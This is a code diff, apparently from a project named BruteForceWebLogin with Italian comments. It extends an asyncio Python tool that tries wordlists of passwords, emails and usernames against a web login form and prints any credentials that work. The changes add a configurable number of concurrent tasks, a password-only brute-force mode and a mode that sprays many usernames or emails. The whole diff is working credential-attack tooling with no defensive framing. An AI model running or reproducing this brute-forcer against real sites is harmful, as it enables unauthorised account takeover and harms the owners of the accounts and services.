@@ -35,13 +35,20 @@ async def login_with_provided_credentials(client, url, identifier,data, password
         print(f"Login riuscito con {'email' if is_email else 'username'}: {identifier} e password: {password}")
     return success
 
-async def login_with_file_credentials(client, url, identifier, passwords,data, is_email):
+async def login_with_file_credentials(client, url, identifier, passwords, is_email, semaphore):
     """Effettua login con tutte le password da un file."""
-    for password in passwords:
-        success = await attempt_login(client, url,data, is_email)
-        if success:
-            print(f"Login riuscito con {'email' if is_email else 'username'}: {identifier} e password: {password}")
-            return True
+    async with semaphore:  # Limita l'accesso a 10 task
+        for password in passwords:
+            data = {'password': password}
+            if is_email:
+                data['email'] = identifier
+            else:
+                data['username'] = identifier
+
+            success = await attempt_login(client, url, data)
+            if success:
+                print(f"Login riuscito con {'email' if is_email else 'username'}: {identifier} e password: {password}")
+                return True
     return False
 
 async def startCredBruteForce():
@@ -89,19 +96,69 @@ async def startCredBruteForce():
         for pair in body_struct.split('&'):
             key, value = pair.split('=')
             data[key] = value
+    
+    # Chiedi il numero di thread
+    while True:
+        thread_input = input("Enter the number of threads (press Enter for default: 3): ")
+        
+        # Usa il valore predefinito se l'input è vuoto
+        if thread_input.strip() == "":
+            thread_number = 3
+            break
+        
+        # Tenta di convertire l'input in un intero
+        try:
+            thread_number = int(thread_input)
+            if thread_number <= 0:  # Assicurati che il numero sia positivo
+                print("Please enter a positive integer. Using default value 3.")
+                thread_number = 3
+                break
+            break  # Esci dal ciclo se l'input è valido
+        except ValueError:
+            print("Invalid input. Please enter a valid integer.")
 
+    
     # Esegui la richiesta con le credenziali inserite
     async with httpx.AsyncClient() as client:
-        if has_password:
+
+        #caso in cui l'utente inserisce mail/user e password
+        if identifier and has_password:
             await login_with_provided_credentials(client, url, identifier, data["password"], is_email)
+
+        #caso in cui l'utente inserisce solo mail/user (bruteforce password only)
+        elif has_password ==  False:
+            passwords = await load_file("./BruteForceWebLogin/passwords.txt")
+            
+            if not passwords:
+                print("Il file delle password è vuoto.")
+                return
+            semaphore = asyncio.Semaphore(thread_number)  # Massimo 10 task simultanei
+            tasks = []
+            tasks.append(login_with_file_credentials(client, url, identifier, passwords, is_email, semaphore))
+            results = await asyncio.gather(*tasks)
+            if any(results):
+                print("Almeno un login è andato a buon fine.")
+        #caso in cui l'utente non conosce nè mail/user nè password (pitchfork attack)
         else:
+            passwords = await load_file("./BruteForceWebLogin/passwords.txt")
+            if not passwords:
+                print("Il file delle password è vuoto.")
+                return
+            
+            semaphore = asyncio.Semaphore(thread_number)  # Massimo 10 task simultanei
+            tasks = []
+            #carico le mail
             if is_email:
                 emails = await load_file("./BruteForceWebLogin/mail.txt")
                 for email in emails:
-                    if await login_with_file_credentials(client, url, email, passwords,data, True):
-                        return
+                    tasks.append(login_with_file_credentials(client, url, email, passwords, is_email, semaphore))
+            #carico gli user
             else:
                 usernames = await load_file("./BruteForceWebLogin/usernames.txt")
                 for username in usernames:
-                    if await login_with_file_credentials(client, url, username, passwords,data, False):
-                        return
+                    tasks.append(login_with_file_credentials(client, url, username, passwords, is_email, semaphore))
+
+            # Attendi che tutte le attività siano completate
+            results = await asyncio.gather(*tasks)
+            if any(results):
+                print("Almeno un login è andato a buon fine.")
